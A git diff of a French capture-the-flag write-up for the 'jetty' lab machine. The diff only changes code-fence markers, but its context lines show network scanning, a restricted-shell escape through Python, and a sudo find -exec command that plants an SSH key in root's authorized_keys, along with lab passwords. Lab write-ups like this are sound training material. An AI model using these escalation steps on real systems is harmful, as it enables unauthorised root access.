@@ -27,7 +27,7 @@ $ sudo nmap -T5 -sP 192.168.56.1/24
 
 Il en ressort une IP répondant au ping :  
 
-```plain
+```
 Nmap scan report for 192.168.56.37
 Host is up (0.00029s latency).
 MAC Address: 08:00:27:58:B4:B0 (Oracle VirtualBox virtual NIC)
@@ -35,7 +35,7 @@ MAC Address: 08:00:27:58:B4:B0 (Oracle VirtualBox virtual NIC)
 
 Etape suivante, le scan des ports TCP de cette adresse :  
 
-```plain
+```
 $ sudo nmap -T5 -p- -sCV 192.168.56.37 -oA jetty
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-27 10:13 CEST
 Nmap scan report for 192.168.56.37
@@ -77,7 +77,7 @@ Une recherche sur la bannière SSH nous renvoie sur [ce paquet pour Ubuntu](http
 
 Le serveur FTP permettant l'accès anonyme j’enchaîne directement sur la récupération des fichiers comme ce fichier texte :  
 
-```plain
+```
 Hi Henry, here you have your ssh's password. As you can see the file is encrypted with the default company's password. 
 Please, once you have read this file, run the following command on your computer to close the FTP server on your side. 
 IT IS VERY IMPORTANT!! CMD: service ftp stop.
@@ -114,7 +114,7 @@ Avant d'aller plus loin j'ai fouillé du côté du serveur web mais les entrées
 
 Une fois connecté via SSH on est averti que l'on est dans un bash restreint :  
 
-```plain
+```
 *You are in a limited shell.
 Type '?' or 'help' to get the list of allowed commands
 squiddie:~$ ?
@@ -123,7 +123,7 @@ cd  clear  exit  help  history  lpath  ls  lsudo  pwd  python  whoami
 
 Le comportement est similaire à sudo dans le sens où la whitelist semble attendre des commandes exactes :  
 
-```plain
+```
 squiddie:~$ python -c 'import pty; pty.spawn("bash")'
 *** forbidden syntax -> "python -c 'import pty; pty.spawn("bash")'"
 *** You have 1 warning(s) left, before getting kicked out.
@@ -132,7 +132,7 @@ This incident has been reported.
 
 On va donc utiliser l'interpréteur Python de façon interactive pour s'échapper du rbash :  
 
-```plain
+```
 squiddie:~$ python
 Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34) 
 [GCC 7.3.0] on linux2
@@ -144,7 +144,7 @@ uid=1001(squiddie) gid=1001(squiddie) groups=1001(squiddie)
 
 Je relève les fichiers suivants dans le dossier de l'utilisateur :  
 
-```plain
+```
 ./Desktop:
 total 16
 drwxr-xr-x  2 squiddie squiddie 4096 Nov 11  2018 .
@@ -184,7 +184,7 @@ On obtient le premier flag dans *user.txt* (*dd69f649f3e5159ddd10b83b56b2dda2*) 
 
 Je note que bien que les tickets pdf semblent identiques visuellement, les sommes de contrôle MD5 ne sont pas les même :  
 
-```plain
+```
 57b7f3a75fa81d6e6191c335a612d8c6  adult_ticket_f.PDF
 17713bdca88d430aa64e294d06459285  adult_ticket.PDF
 6d1061a316ec323937a0930bafaf9b8d  child_ticket_f.PDF
@@ -193,7 +193,7 @@ Je note que bien que les tickets pdf semblent identiques visuellement, les somme
 
 Sous la racine web je trouve un fichier encodé :  
 
-```plain
+```
 squiddie@jetty:~$ cat /var/www/html/recoverpassword.txt 
 Backup password:
 
@@ -229,7 +229,7 @@ User squiddie may run the following commands on jetty:
 
 Les utilisateurs Linux confirmés auront immédiatement recours à l'option *exec* de la commande :  
 
-```plain
+```
 sudo /usr/bin/find -name recoverpassword.txt -exec bash -c 'echo ssh-rsa --- snip ma clé publique ssh --- > /root/.ssh/authorized_keys' \;
 ```
 
@@ -250,7 +250,7 @@ Say to Mary that I want to go on vacation on 2 weeks.
 
 L'utilisateur root dispose d'un dossier caché :  
 
-```plain
+```
 ./Documents:
 total 220
 drwxr-xr-x  4 root root   4096 Oct 22  2018 .
@@ -287,7 +287,7 @@ drwxr-xr-x 4 root root  4096 Oct 22  2018 ..
 
 Il y a un fichier qui semble contenir des mots de passe chiffrés avec un outil maison :  
 
-```plain
+```
 root@jetty:/root/Documents/.docs/Password_keeper# ls
 database.txt  password_keeper.exe  usage.txt
 root@jetty:/root/Documents/.docs/Password_keeper# cat usage.txt 
@@ -380,7 +380,7 @@ Le code s'attend à ce que le résultat d'un base64 sur le mot de passe saisi co
 
 Le programme généré par PyInstaller est un exécutable Windows mais Wine est installé sur la VM du CTF. On peut donc l'exécuter puis saisir le mot de passe, ce qui nous dump les infos suivantes :  
 
-```plain
+```
 Tag: instagram Password: S3x1B0y
 Tag: facebook Password: M4rK1sS0s3X1
 Tag: Accountabilty_not_cooked Password: co8oiads13kt
